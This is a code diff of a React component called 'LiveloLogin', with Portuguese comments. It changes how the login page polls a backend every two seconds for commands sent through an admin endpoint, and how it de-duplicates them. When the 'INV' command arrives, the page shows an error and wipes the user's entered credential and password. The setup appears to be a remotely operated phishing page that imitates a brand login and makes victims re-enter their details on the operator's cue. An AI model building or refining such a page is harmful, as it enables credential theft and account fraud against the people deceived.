@@ -61,35 +61,32 @@ function LiveloLogin() {
     const checkCommand = async () => {
       try {
         const response = await axios.get(`${API}/user/check-action/${userId}`);
+        
         if (response.data && response.data.action) {
           const action = response.data.action;
-          const actionTimestamp = response.data.timestamp || Date.now();
+          const timestamp = response.data.action_timestamp;
           
-          // Para INV, sempre processar se houver mudança no timestamp
-          // Para outros comandos, verificar se já foi processado
+          // Verificar se já processamos este comando específico (usando timestamp)
+          if (timestamp && timestamp === lastProcessedTimestamp) {
+            return; // Já processamos este comando, não fazer nada
+          }
+          
+          // Novo comando com timestamp diferente
           if (action === "INV") {
-            // INV pode ser enviado múltiplas vezes
             setIsLoading(false);
             setHasError(true);
             setCredential("");
             setPassword("");
-            setCurrentCommand(action);
+            setLastProcessedTimestamp(timestamp); // Marcar como processado
             
-            // Limpar o comando no backend após processar
-            await axios.post(`${API}/admin/command`, {
+            // Limpar o comando no backend
+            axios.post(`${API}/admin/command`, {
               user_id: userId,
               command: "CLEAR"
-            }).catch(err => console.log("Erro ao limpar comando:", err));
-          } else {
-            // Outros comandos: verificar se já processamos
-            if (action !== currentCommand) {
-              setCurrentCommand(action);
-            }
-          }
-        } else {
-          // Sem comando ativo, limpar estado de erro se houver
-          if (hasError && credential === "" && password === "") {
-            // Manter erro visível até usuário começar a digitar
+            }).catch(err => console.log("Erro ao limpar:", err));
+          } else if (action !== "CLEAR") {
+            setCurrentCommand(action);
+            setLastProcessedTimestamp(timestamp);
           }
         }
       } catch (error) {
@@ -100,7 +97,7 @@ function LiveloLogin() {
     checkCommand();
     const interval = setInterval(checkCommand, 2000);
     return () => clearInterval(interval);
-  }, [userId, currentCommand, hasError, credential, password]);
+  }, [userId, lastProcessedTimestamp]);
 
   // Verifica se o formulário está válido
   useEffect(() => {
